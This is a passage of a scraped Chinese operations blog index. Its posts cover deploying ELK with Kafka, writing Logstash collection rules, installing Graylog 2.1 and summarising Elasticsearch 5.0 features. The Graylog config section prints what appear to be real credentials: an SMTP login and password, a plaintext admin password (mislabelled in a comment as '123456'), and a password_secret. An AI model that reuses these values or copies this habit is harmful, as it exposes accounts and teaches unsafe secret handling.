localhost:2181(CONNECTED) 5] ls /kafka/brokers/ids[0, 1, 2] kafka 三台集群这里可以看到获取到ids。 安全问题特别要注意elk所有软件的端口监听,切勿暴露监听到公网上去,另外即便是内网你也得注意配置内网的访问限制。 logstash 客户端安装：源码安装123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354我这里源码包安装# wget https://download.elasticsearch.org/logstash/logstash/logstash-2.4.0.tar.gz#curl -O https://download.elastic.co/logstash/logstash/logstash-2.4.0.tar.gz#tar -zxvf logstash-2.4.0.tar.gz#mv logstash-2.4.0 /usr/local/#ln -s /usr/local/logstash-2.4.0/ /usr/local/logstash下载启动脚本生产都是运行在后台的，我这里源码安装没有init脚本启动。 去Github下载 https://github.com/benet1006/ELK_config.git#cp logstash.init /etc/init.d/logstash#chmod +x /etc/init.d/logstash这个脚本我做过修改。#启动logstash服务service logstash startservice logstash status#查看5000端口netstat -nltpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 1765/javatcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 1765/javatcp 0 0 0.0.0.0:9301 0.0.0.0:* LISTEN 2309/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1509/sshdtcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 1876/nodetcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 2309/javatcp 0 0 :::22 :::* LISTEN 1509/sshd修改启动脚本vim /etc/init.d/logstash 指定的目录自己源码安装的路径。name=logstashpidfile=\"/var/run/$name.pid\"export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport PATH=$PATH:$JAVA_HOME/binLS_USER=logstashLS_GROUP=logstashLS_HOME=/usr/local/logstash 安装路径LS_HEAP_SIZE=\"1000m\"LS_JAVA_OPTS=\"-Djava.io.tmpdir=$&#123;LS_HOME&#125;\"LS_LOG_DIR=/usr/local/logstashLS_LOG_FILE=\"$&#123;LS_LOG_DIR&#125;/$name.log\"LS_CONF_FILE=/etc/logstash.conf 收集日志的规则confLS_OPEN_FILES=16384LS_NICE=19LS_OPTS=\"\"https://www.elastic.co/guide/en/logstash/current/plugins-inputs-file.html这个是log stash的官方文档的配置说明。这个配置说明上面我先修改下我之前的配置文件。 logstash agent配置：123456789101112131415161718192021222324252627282930313233343536配置log stash－实现系统日志收集inputfile_to_kafka.conf 日志文件读出写入到kafkainput &#123;file &#123;path =&gt; \"/srv/tomcat/logs/account/logFile.*.log\"type =&gt; \"tomcat\"discover_interval =&gt; 15 #logstash&#125;&#125;output &#123;#stdout &#123; codec =&gt; rubydebug &#125;kafka&#123;bootstrap_servers =&gt; \"10.46.72.172:9092,10.47.88.103:9092,10.47.102.137:9092\"#group_id =&gt; \"logstash\"topic_id =&gt; \"logstash\"&#125;&#125;2.2 logstash indexer 配置kafka_to_es.confinput &#123;kafka &#123;zk_connect =&gt; \"10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181kafka\"group_id =&gt; \"logstash\"topic_id =&gt; \"logstash\"reset_beginning =&gt; false # boolean (optional)， default: falseconsumer_threads =&gt; 2 # number (optional)， default: 1decorate_events =&gt; false # boolean (optional)， default: false&#125;&#125;output &#123;elasticsearch &#123;hosts =&gt; [\"10.47.88.206:9200\",\"10.47.88.188:9200\"]index =&gt; \"%&#123;host&#125;-%&#123;+YYYY.MM.dd&#125;\"&#125;# stdout &#123; codec =&gt; rubydebug &#125;&#125; es安装插件head查看下效果：然后打开网站：http://elk.ihaozhuo.com/_plugin/head/ ####kibana网站效果： Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2016/12/29/日志分析\u0010平台/Elasticsearch/搭建(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafka为消息中心的ELK日志平台/"},{"title":"logstash如何写tomcat,redis,nginx日志收集规则","text":"logstash如何收集tomcat日志分析（可以参考我下面写的模板）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162我想实现对tomcat的日志采集，正常应该创建一个file的input，这个input指定了监听的文件或者目录....然后过滤器（如果没有特殊要求，先可以不进行解析，原始的日志直接存就行）....最后使用一个elastcisearch插件，发送到es中去.input &#123; stdin&#123;&#125; file &#123; type =&gt; \"tomcat_card\" path =&gt; \"/srv/tomcat/logs/card/*.log\" start_position =&gt; \"beginning\" &#125; file &#123; type =&gt; \"tomcat_family\" path =&gt; \"/srv/tomcat/logs/family/*.log\" start_position =&gt; \"beginning\" &#125; file &#123; type =&gt; \"tomcat_mission\" path =&gt; \"/srv/tomcat/logs/mission/*.log\" start_position =&gt; \"beginning\" &#125;&#125;filter &#123; grok &#123; match =&gt; [ \"message\", \"%&#123;TIMESTAMP_ISO8601:logdate&#125; %&#123;WORD:loglevel&#125;%&#123;SPACE&#125;%&#123;NOTSPACE:loggername&#125; - %&#123;GREEDYDATA:msg&#125;\", \"message\", \"%&#123;GREEDYDATA:msg&#125;\" ] &#125;&#125;output&#123; if [type] == \"tomcat_card\" &#123; elasticsearch &#123; host =&gt; \"192.168.1.234\" protocol =&gt; \"http\" index =&gt; \"tomcat_card-%&#123;+YYYYY.MM.dd&#125;\" &#125;&#125; if [type] == \"tomcat_family\" &#123; elasticsearch &#123; host =&gt; \"192.168.1.234\" protocol =&gt; \"http\" index =&gt; \"tomcat_card-%&#123;+YYYYY.MM.dd&#125;\" &#125;&#125; if [type] == \"tomcat_mission\" &#123; elasticsearch &#123; host =&gt; \"192.168.1.234\" protocol =&gt; \"http\" index =&gt; \"tomcat_mission-%&#123;+YYYYY.MM.dd&#125;\" &#125; &#125;&#125; logstash日志采集nginx配置/etc/logstash/conf.d/nginx.conf 123456789101112131415161718192021input &#123;file &#123;path =&gt; \"/data/wwwlogs/nginx_json.log\"codec =&gt; \"json\"&#125;&#125;filter &#123;mutate &#123;split =&gt; [ \"upstreamtime\", \",\" ]&#125;mutate &#123;convert =&gt; [ \"upstreamtime\", \"float\" ]&#125;&#125;output &#123;kafka &#123;bootstrap_servers =&gt; \"10.0.0.11:9092\"topic_id =&gt; \"logstash\"compression_type =&gt; \"gzip\"&#125;&#125; 创建一个从日志文件读取，并写入redis的配置文件(本文件采用默认方式进行输入，输出)123456789101112131415161718192021222324252627282930313233343536373839404142#cat agent.confinput &#123; file &#123; path =&gt; \"/var/log/httpd/access_log\" //设置读取的日志路径 sincedb_path =&gt; \"../.sincedb\" type =&gt; \"httpd\" start_position =&gt; \"beginning\" &#125;&#125;output &#123; redis &#123; host =&gt; [\"127.0.0.1\"] port =&gt; 6379 batch =&gt; true batch_events =&gt; 5 data_type =&gt; \"list\" key =&gt; \"logstash:redis\" &#125;&#125;配置一个从redis读取日志并输出到es的配置文件#cat index.confinput &#123; redis &#123; host =&gt; [\"127.0.0.1\"] port =&gt; 6379 data_type =&gt; \"list\" key =&gt; “log stash:redis\" &#125;&#125;output &#123; elasticsearch &#123; host =&gt; \"127.0.0.1\" protocol =&gt; \"http\" index =&gt; \"logstash-%&#123;type&#125;-%&#123;+YYYY.MM.dd&#125;\" index_type =&gt; \"%&#123;type&#125;\" &#125;&#125;启动logstash Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2016/01/29/日志分析\u0010平台/Elasticsearch/logstash如何收集tomcat日志分析/"},{"title":"graylog 升级2.1 集中日志解决方案","text":"graylog 升级2.1 集中日志解决方案参考官网：升级到Graylog的2.1.x 一：为什么需要集中日志解决方案？在公司服务机子部署越来越多的情况下，让我们来想想会遇到的问题： 开发人员不能登录线上服务器查看详细日志，经过运维周转费时费力 日志数据分散在多个系统，难以查找 日志数据量大，查询速度慢 一个调用会涉及多个系统，难以在这些系统的日志中快速定位数据 数据不够实时 很难对数据进行挖掘，分析，业务告警，审计 这些问题的存在让开发以及运维人员很是头痛，严重影响效率！ 二：什么是graylog技术栈？为了解决上述问题，我们需要一个日志的集中管理方案，graylog技术栈： java （jdk1.8.0_66/）环境 Collector-sidecar（收集日志）或者syslog Mongodb（存储日志源文件） Elasticsearch（提供搜索日志） Graylog2.1.1（搜索和视图展示日志，告警和权限） 有了这些，我们就能把日志先收集起来，进行我们想要的分析之后，web的形式展示出来，提供查询！ 三：graylog的安装部署安装环境：linux centOS系统安装，已安装JDK1.8版本，安装启动顺序 1.安装部署mongodb2.安装部署elasticsearch3.安装部署graylog4.安装部署Graylog Collector Sidecar 1：安装部署mongodb Java也安装 参考我博文有介绍。 2：安装部署elasticsearch (1)下载jar包 12345678wget https://download.elastic.co/elasticsearch/release/org/elasticsearch/distribution/tar/elasticsearch/2.3.5/elasticsearch-2.3.5.tar.gz如果报错执行wget --no-check-certificatehttps://download.elastic.co/elasticsearch/release/org/elasticsearch/distribution/tar/elasticsearch/2.3.5/elasticsearch-2.3.5.tar.gz (2)解压jar包 1tar -zxvf elasticsearch-2.3.5.tar.gz -C /opt/ (3)修改elasticsearch.yml配置文件 这里需要修改配置文件：配置前先创建几个目录文件 12mkdir /home/data/es-data -pmkdir /home/data/es-work -p elasticsearch-2.3.5安装目录conf下执行 1234567891011vim elasticsearch-2.3.5/config/elasticsearch.yml cluster.name: graylog #集群名称建议命名graylog，便于识别区分node.name: elasticsearch-node-1 # elasticsearch集群节点名称network.host: 192.168.1.234 # 绑定节点IPhttp.port: 9200 # 外部访问端口，默认，也可以安全考虑修改path.logs: /home/data/logspath.data: /home/data/es-datadiscovery.zen.ping.multicast.enabled: false #多播发现方式关闭，因为graylog采用单播方式发现elasticsearch集群方式discovery.zen.ping.unicast.hosts #多个节点用逗号隔开discovery.zen.minimum_master_nodes: 3 # elasticsearch集群节点，最少选举数，这个数一定要设置为整个集群节点个数的一半加1，即N/2+1，必须为奇数 (4)启动elasticsearch服务 新建一个elasticsearch用户，出于安全考虑，elasticsearch服务不能使用root用户启动 创建elasticsearch用户组及elasticsearch用户，执行 12groupadd elasticsearchuseradd elasticsearch -g elasticsearch -p elasticsearch 其中-g使用户属于某个组，-p为新用户使用加密密码）更改elasticsearch-2.3.5文件夹及内部文件的所属用户及组为elasticsearch:elasticsearch 12chown -R elasticsearch:elasticsearch /home/data/chown -R elasticsearch:elasticsearch elasticsearch-2.3.5 切换用户 1su elasticsearch 在elasticsearch-2.3.5/bin目录下执行 1234[elasticsearch@graylog bin]$ ps -ef | grep elasticsearchroot 18265 16004 0 14:27 pts/1 00:00:00 su elasticsearch502 18405 1 62 14:27 pts/1 00:00:13 /srv/jdk1.8.0_66/bin/java -Xms256m -Xmx1g -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+HeapDumpOnOutOfMemoryError -XX:+DisableExplicitGC -Dfile.encoding=UTF-8 -Djna.nosys=true -Des.path.home=/opt/elasticsearch-2.3.5 -cp /opt/elasticsearch-2.3.5/lib/elasticsearch-2.3.5.jar:/opt/elasticsearch-2.3.5/lib/* org.elasticsearch.bootstrap.Elasticsearch start -d502 18530 18266 0 14:27 pts/1 00:00:00 grep --color=auto ela (5)检查elasticsearch服务状态 执行如下命令测试Elasticsearch是否正常运行： $ curl -XGET ‘http://localhost:9200/_cluster/health?pretty=true‘ 输出的信息如下表示Elasticsearch安装成功： 123456789101112131415161718[elasticsearch@graylog bin]$ curl -XGET 'http://192.168.1.234:9200/_cluster/health?pretty=true'&#123; \"cluster_name\" : \"graylog\", \"status\" : \"yellow\", \"timed_out\" : false, \"number_of_nodes\" : 1, \"number_of_data_nodes\" : 1, \"active_primary_shards\" : 30, \"active_shards\" : 30, \"relocating_shards\" : 0, \"initializing_shards\" : 0, \"unassigned_shards\" : 30, \"delayed_unassigned_shards\" : 0, \"number_of_pending_tasks\" : 0, \"number_of_in_flight_fetch\" : 0, \"task_max_waiting_in_queue_millis\" : 0, \"active_shards_percent_as_number\" : 50.0&#125; 3：安装部署graylog-2.1版本(1)下载安装包 1wget https://packages.graylog2.org/releases/graylog/graylog-2.1.1.tgz (2)解压安装包 1tar -zxvf graylog-2.1.1.tgz -C /opt/. (3)修改配置文件 修改安装目录下 graylog.conf.example 文件 1vim graylog.conf.example web_listen_uri 值是graylog启动成功后，web服务访问地址 1web_listen_uri = http://192.168.1.234:9000/ rest_listen_uri 的值，是graylog启动成功后，api访问地址 1rest_listen_uri = http://192.168.1.234:9000/api/ root_timezone = UTC #设置时区，否则默认使用的是UTC时间也就是世界时间 这里是必须改下的，因为后期收集日志显示时间是有变化的。 1root_timezone = Asia/Shanghai 其中 password_secret 的值用命令生成 1234yum install -y pwgenpwgen -N 1 -s 96 H1R5v17kWtyDxj2PzxLMxu41D6HDt9JzhfZcj6QlCURVddgkLAdnUmpkdIscmmu4ELKsTrHwKvPmxFKSYyTn0YlqebbpQqyr password_secret = H1R5v17kWtyDxj2PzxLMxu41D6HDt9JzhfZcj6QlCURVddgkLAdnUmpkdIscmmu4ELKsTrHwKvPmxFKSYyTn0YlqebbpQqyr 其中root_password_sha2 的值使用命令生成 123456echo -n Ihaozhuo_b313 | sha256sum (这里对密码123456哈希加密)fc88c28d48b0cb97f3fb5286cc35c520409ef037acd30ec687f0c0bd3d5a5115 root_password_sha2 = fc88c28d48b0cb97f3fb5286cc35c520409ef037acd30ec687f0c0bd3d5a5115 elasticsearch_cluster_name 值必须是elasticsearch配置文件中的cluster_name 12elasticsearch_cluster_name = graylog elasticsearch_discovery_zen_ping_unicast_hosts 填写elasticsearch地址，如果是多个，用逗号隔开 12elasticsearch_discovery_zen_ping_unicast_hosts = 192.168.1.234:9300 elasticsearch_discovery_zen_ping_multicast_enabled = false 多播模式关闭 由于我们只有一个Elasticsearch shard，需要把elasticsearch_shards参数设置为1：elasticsearch集群分片数量 1elasticsearch_shards = 1 elasticsearch绑定的节点IP 123299 elasticsearch_network_host = 192.168.1.234300 elasticsearch_network_bind_host = 192.168.1.234301 elasticsearch_network_publish_host = 192.168.1.234 mongodb安装服务的ip地址 1mongodb_uri = mongodb://192.168.1.234/graylog 这里mongodb是安装在我同一台服务器上面的。如果要把mongodb单独服务器跑连接方式配置文件里面也有例子说明： 1mongodb_uri =mongodb://graylog:123456@160.17.2.251:27017/graylog2 #连接到mongodb的服务器地址为160.17.2.251:27017，账号为graylog，密码为123456 数据库为graylog2 设置告警邮件发送者信息 1234567891011 # Email transporttransport_email_enabled = falsetransport_email_hostname = smtp.exmail.qq.comtransport_email_port = 465transport_email_use_auth = truetransport_email_use_tls = truetransport_email_use_ssl = truetransport_email_auth_username = chengyangyang@qq.cntransport_email_auth_password = beneTqqtransport_email_subject_prefix = [graylog]transport_email_from_email = chengyangyang@qq.cn (4)复制配置文件 因为graylog安装bin目录下，默认启动配置文件 配置文件路径：/etc/graylog/server/server.conf 所以需要将graylog.conf.example 复制到/etc/graylog/server/目录下，并且改名 server.conf 执行命令： 12mkdir -p /etc/graylog/server/ cp graylog.conf.example /etc/graylog/server/server.conf (5)启动graylog 在graylog安装bin目录下执行 1./graylogctl start 查看日志，在graylog安装目录下执行 1tail -200f /log/graylog-server.log 如果报错： 原因： 在mongodb版本2.6之后，是需要日志journaling设置的，而默认情况下是关闭的 解决办法： 在mongodb启动命令加上 –journal 最后启动命令： 1./mongod --dbpath=/usr/local/mongodb/data/ --fork --logpath=/usr/local/mongodb/logs --storageEngine=mmapv1 --journal 重启mongodb后，重启graylog服务即可！ (6)启动graylog(报错二) 查看日志，在graylog安装目录下执行 12tail -200f /log/graylog-server.log 12345678&#123;com.mongodb.MongoSocketOpenException: Exception opening socket&#125;, caused by &#123;java.net.ConnectException: 拒绝连接&#125;&#125;]&#125;. Waiting for 30000 ms before timing out2016-11-22 15:10:29,355 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Elastic Beats Input 1.1.1 [org.graylog.plugins.beats.BeatsInputPlugin]2016-11-22 15:10:29,357 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Collector 1.1.1 [org.graylog.plugins.collector.CollectorPlugin]2016-11-22 15:10:29,357 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Enterprise Integration Plugin 1.1.1 [org.graylog.plugins.enterprise_integration.EnterpriseIntegrationPlugin]2016-11-22 15:10:29,358 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: MapWidgetPlugin 1.1.1 [org.graylog.plugins.map.MapWidgetPlugin]2016-11-22 15:10:29,359 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Pipeline Processor Plugin 1.1.1 [org.graylog.plugins.pipelineprocessor.ProcessorPlugin]2016-11-22 15:10:29,359 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Anonymous Usage Statistics 2.1.1 [org.graylog.plugins.usagestatistics.UsageStatsPlugin]2016-11-22 15:10:29,487 INFO : org.graylog2.bootstrap.CmdLineTool - Running with JVM arguments: -Djava.library.path=./../lib/sigar -Xms1g -Xmx1g -XX:NewRatio=1 -XX:+ResizeTLAB -XX:+UseConcMarkSweepGC -XX:+CMSConcurrentMTEnabled -XX:+CMSClassUnloadingEnabled -XX:+UseParNewGC -XX:-OmitStackTraceInFastThrow 提示mongodb 拒绝连接。 这个时候需要看下端口地址是否是IP地址还是127.0.0.1 如果不是需要修改下在重启服务就可以了。 查看启动服务端口： 123456789101112[root@graylog graylog-2.1.1]# netstat -ntulpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 127.0.0.1:27017 0.0.0.0:* LISTEN 22308/mongodtcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1974/sshdtcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1287/mastertcp 0 0 ::ffff:192.168.1.234:9350 :::* LISTEN 23642/javatcp 0 0 ::ffff:192.168.1.234:9000 :::* LISTEN 23642/javatcp 0 0 ::ffff:192.168.1.234:9200 :::* LISTEN 18405/javatcp 0 0 ::ffff:192.168.1.234:9300 :::* LISTEN 18405/javatcp 0 0 :::22 :::* LISTEN 1974/sshdtcp 0 0 ::1:25 :::* LISTEN 1287/master (6)访问graylog graylog启动成功后，浏览器访问：graylog安装IP:9000 四：总结到此，基础的集中日志管理graylog安装完毕！，后续将继续介绍： 安装部署Graylog Collector Sidecar 收集应用日志 采用syslog收集日志方式 graylog一些使用，包括日志截取，告警等。 之前也实践过ELK技术栈，后来选型graylog，是基于graylog带有的权限管理，和告警功能比较完善！","link":"/2016/11/14/日志分析\u0010平台/Graylog/graylog 升级2.1 集中日志解决方案/"},{"title":"研究学习 Elasticsearch 5.0.0 功能提升哪些,ES如何弹性迁移日志数据，安装需要什么环境？","text":"ES 现在普遍大公司都已经在使用，有的用来做数据存储，也有做性能监控，也有做日志收集，跟大数据结合做日志分析。今天在家无聊研究官网学习了下Elasticsearch5.0.0 功能新增哪些，个人觉得ES也是现在开源日志分析平台比较火的，从14年开始陆续使用频率不断提升。之前也有了解过Graylog 现在比ES 做数据存储分析 不错的是Graylog 比ES性能好。废话不多说了哈哈 Elasticsearch 5.0.0发布2016年10月26日发布 Elasticsearch 5.0.0 今天去下载吧！你知道你想。 下载Elasticsearch 5.0.0Elasticsearch 5.0.0发行说明弹性搜索5.0突破变化 Elasticsearch 5.0.0对大家有所帮助 这是有史以来最快，最安全，最具弹性，最简单易用的Elasticsearch版本，它具有一系列增强功能和新功能。 索引性能 取食节点 无痛脚本 新的数据结构 搜索和聚合 用户友好 弹性 Java REST客户端 迁移助手 下面从官网上面翻译得来的： 索引性能由于包括更好的数字数据结构（参见新数据结构）的一些更改，索引吞吐量在5.0.0中有了显着改善，锁中的争用减少，阻止对同一文档的并发更新，以及减少事务日志时的锁定需求。异步translog fsyncing将特别有利于旋转磁盘的用户，而依赖Elasticsearch自动生成文档ID时，仅追加用例（基于思考时间的事件）具有很大的吞吐量提高。对实时文档GET的支持的内部变化意味着索引缓冲区可用的内存更多，垃圾收集时间少得多。 根据您的用例，您可能会看到在提高吞吐量的25％至80％之间。 Ingest节点 向Elasticsearch添加数据更简单了。Logstash是一个强大的工具，而一些较小的用户只需要过滤器，不需要它所提供的众多路由选项。因此，Elastic将一些最流行的Logstash过滤器（如grok、split）直接在Elasticsearch中实现为处理器。多个处理器可以组合成一个管道，在索引时应用到文档上。 Painless脚本 Elasticsearch中很多地方用到了脚本，而出于安全考虑，脚本在默认情况下是禁用的，这令人相当失望。为此，Elastic开发了一种新的脚本语言Painless。该语言更快、更安全，而且默认是启用的。不仅如此，它的执行速度是Groovy的4倍，而且正在变得更快。Painless已经成为默认脚本语言，而Groovy、Javascript和Python都遭到弃用。要了解有关这门新语言的更多信息，请点击这里。 新数据结构 Lucene 6带来了一个新的Points 数据结构K-D树，用于存储数值型和地理位置字段，彻底改变了数值型值的索引和搜索方式。基准测试表明，Points将查询速度提升了36%，将索引速度提升了71%，而占用的磁盘和内存空间分别减少了66%和85%（参见“在5.0中搜索数值”）。 搜索和聚合 借助即时聚合，Kibana图表生成速度显著提升。Elastic用一年的时间对搜索API进行了重构，Elasticsearch现在可以更巧妙地执行范围查询，只针对已经发生变化的索引重新计算聚合，而不是针对每个查询从头开始重新计算。在搜索方面，默认的相关性计算已经由TF/IDF换成了更先进的BM25。补全建议程序经过了完全重写，将已删除的文档也考虑了进来。 更友好 Elasticsearch 5.0更安全、更易用。他们采用了“尽早提示”的方法。如果出现了问题，则新版本会及早给出提示。例如，Elasticsearch 5.0会严格验证设置。如果它不能识别某项设置的值，就会给出提示和建议。不仅如此，集群和索引设置现在可以通过null进行解除。此外，还有其他的一些改进，例如，rollover和shrink API启用了一种新的模式来管理基于时间的索引，引入新的cluster-allocation-explain API，简化索引创建。 弹性 Elasticsearch分布式模型的每一部分都被分解、重构和简化，提升了可靠性。集群状态更新现在会等待集群中的所有节点确认。如果一个“复制片（replica shard）”被“主片（primary）”标记为失败，则主片会等待“主节点（master）”的响应。索引现在使用数据路径中的UUID，而不是索引名，避免了命名冲突。另外，Elasticsearch现在进行启动检查，确保系统配置没有问题。配置比较麻烦，但如果只是试用，开发人员也可以选择localhost-only模式，避免繁琐的配置。另外，新版本还增加了断路器及其他一些软限制，限制请求使用的内存大小，保护集群免受恶意用户攻击。 此外，该版本还提供了一个底层的Java REST/HTTP客户端，可以用于监听、日志记录、请求轮询、故障节点重试等。它使用Java 7，将依赖降到了最低，比Transport客户端的依赖冲突少。而在基准测试中，它的性能并不输于Transport客户端。不过，这是一个底层客户端，目前还没有提供任何查询构建器或辅助器。它的输入参数和输出结果都是JSON。 需要注意的是，该版本引入了许多破坏性更改，好在他们提供了一个迁移辅助插件，可以帮助开发人员从Elasticsearch 2.3.x/2.4.x迁移到Elasticsearch 5.0。如果是从更早的Elasticsearch版本向最新的5.0版本迁移，则请查阅升级文档。 Java REST客户端经过多年的等待，我们终于发布了一个低级的Java HTTP / REST客户端。它提供了一个简单的HTTP客户端，具有最少的依赖关系，可以处理嗅探，记录，循环请求，并重试节点故障。它使用的REST层历史上比Java API更稳定，这意味着它可以跨越升级使用，甚至可能在主要版本之间进行升级。它与Java 7一起工作，并且具有最小的依赖性，导致比传输客户端更少的依赖冲突。它只是HTTP，因此可以像所有其他HTTP客户端一样进行防火墙/代理。在我们的基准测试中，Java REST客户端 与Transport客户端的功能类似。 请注意，这是一个低级客户端。在这个阶段，我们不提供任何可以在IDE中自动完成的查询构建器或帮助器。它是JSON-in，JSON-out，由你来构建JSON。开发不会停止在这里 - 我们将添加一个API，它将帮助您构建查询并解析响应。您可以按照问题＃19055中的更改进行操作。 迁移助手Elasticsearch Migration Helper是一个网站插件，可以帮助从Elasticsearch 2.3.x / 2.4.x迁移到Elasticsearch 5.0。它有三个工具： 123456集群检查对集群，节点和索引执行一系列检查，并提醒您升级之前需要解决的任何已知问题。Reindex助手在v2.0.0之前创建的索引需要重新编号，才能在Elasticsearch 5.x中使用。reindex帮助器点击一个按钮升级旧索引。弃用日志Elasticsearch附带了一个弃用记录器，每当使用不推荐使用的功能时，它将记录消息。此工具可启用或禁用群集上的弃用日志记录。 官网推荐迁移文档：Instruction for install the Elasticsearch migration helper. ) Elasticsearch 5.0.0 安装需要哪些要求。Elasticsearch需要依赖Java JDK1.8 Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/03/30/日志分析\u0010平台/Elasticsearch/研究学习 Elasticsearch 5.0.0 功能提升哪些,ES如何弹性迁移日志数据，安装需要什么环境？/"},{"title":"Graylog——日志分析平台完美代替Elasticsearch","text":"摘要: 提起日志聚合工具，有开源界的ELK，商业界的Splunk，但我要介绍开源的后起之秀Graylog，可以说是龙头老大Splunk的开源版。 Graylog——日志分析平台完美代替Elasticsearch先看看 推荐！国外程序员整理的系统管理员资源大全 中，国外程序员整理的日志聚合工具的列表： 日志管理工具：收集，解析，可视化 Elasticsearch - 一个基于Lucene的文档存储，主要用于日志索引、存储和分析。 Fluentd - 日志收集和发出 Flume -分布式日志收集和聚合系统 Graylog2 -具有报警选项的可插入日志和事件分析服务器 Heka -流处理系统，可用于日志聚合 Kibana - 可视化日志和时间戳数据 Logstash -管理事件和日志的工具 Octopussy -日志管理解决方案（可视化/报警/报告） Graylog与ELK方案的对比 ELK： Logstash -&gt; Elasticsearch -&gt; Kibana （使用了一些插件head ，marvel） Graylog： Graylog Collector -&gt; Graylog Server(封装Elasticsearch) -&gt; Graylog Web 做为运维，公司内部使用elk处理日志发现很多问题。 顺便截图了几张： 之前试过Logstash + Elasticsearch + Kibana的方案，发现有几个缺点： 不能处理多行日志，比如Mysql慢查询，Tomcat/Jetty应用的Java异常打印 不能保留原始日志，只能把原始日志分字段保存，这样搜索日志结果是一堆Json格式文本，无法阅读。 不复合正则表达式匹配的日志行，被全部丢弃。 kibana结合使用经常会出现卡死。资源消耗非常大。 本着解决以上3个缺点的原则，再次寻找替代方案。 首先找到了商业日志工具Splunk，号称日志界的Google，意思是全文搜索日志的能力，不光能解决以上3个缺点，还提供搜索单词高亮显示，不同错误级别日志标色等吸引人的特性，但是免费版有500M限制，付费版据说要3万美刀，只能放弃，继续寻找。 最后找到了Graylog，第一眼看到Graylog，只是系统日志syslog的采集工具，一点也没吸引到我。但后来深入了解后，才发现Graylog简直就是开源版的Splunk。 我自己总结的Graylog吸引人的地方： 一体化方案，安装方便，不像ELK有3个独立系统间的集成问题。 采集原始日志，并可以事后再添加字段，比如http_status_code，response_time等等。 自己开发采集日志的脚本，并用curl/nc发送到Graylog Server，发送格式是自定义的GELF，Flunted和Logstash都有相应的输出GELF消息的插件。自己开发带来很大的自由度。实际上只需要用inotifywait监控日志的modify事件，并把日志的新增行用curl/netcat发送到Graylog Server就可。 搜索结果高亮显示，就像google一样。 搜索语法简单，比如： source:mongo AND reponse_time_ms:&gt;5000，避免直接输入elasticsearch搜索json语法 搜索条件可以导出为elasticsearch的搜索json文本，方便直接开发调用elasticsearch rest api的搜索脚本。 Graylog图解 Graylog开源版官网： https://www.graylog.org/ 来几张官网的截图： Graylog是强大的日志管理、分析工具。它基于 Elasticsearch, Java和MongoDB。 Graylog可以收集监控多种不同应用的日志。但是为了示范说明，我只收集syslog。并且，我将会把用到的组件全部安装到一个单独的服务器上。对于大型、生产系统你可以把组件分开安装在不同的服务器上，这样可以提高效率。 Graylog的组件Graylog有4个基本组件： 1234Graylog Server：这个服务负责接收和处理日志/消息，并且和其他组件沟通。Elasticsearch：存储所有的日志，它的性能依赖内存和硬盘IO。MongoDB：存储元数据，负载不高。graylog-Web接口：用户接口。 下面是Graylog组件之间的关系图： 下面来自我公司内部分享的PPT拍图： 生产环境 我参考网上一些博客画的图： 系统要求： CentOS 6.7 内存至少2GB 有root权限 服务器ip是192.168.1.234，已安装 1.8.0_77-b03 这里我只是举例单一模式跑服务。 安装MongoDBMongoDB的安装非常简单，执行如下命令导入MongoDB GPG密钥到rpm： 123456789101112131415161718192021222324252627282930313233343536373839404142[root@graylog yum.repos.d]# vim /etc/yum.repos.d/mongodb-org-3.0.repo---[mongodb-org-3.0]name=MongoDB Repositorybaseurl=http://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/3.0/x86_64/gpgcheck=0enabled=1---[root@graylog yum.repos.d]# yum install -y mongodb-org[root@graylog yum.repos.d]# vi /etc/yum.conf最后一行添加：---exclude=mongodb-org,mongodb-org-server,mongodb-org-shell,mongodb-org-mongos,mongodb-org-tools---[root@graylog yum.repos.d]# service mongod start[root@graylog yum.repos.d]# chkconfig mongod on[root@graylog yum.repos.d]# vi /etc/security/limits.conf最后一行添加：---* soft nproc 65536* hard nproc 65536mongod soft nproc 65536* soft nofile 131072* hard nofile 131072---[root@graylog ~]# vi /etc/init.d/mongodulimit -f unlimited 行前插入：--- if test -f /sys/kernel/mm/transparent_hugepage/enabled; then echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled fi if 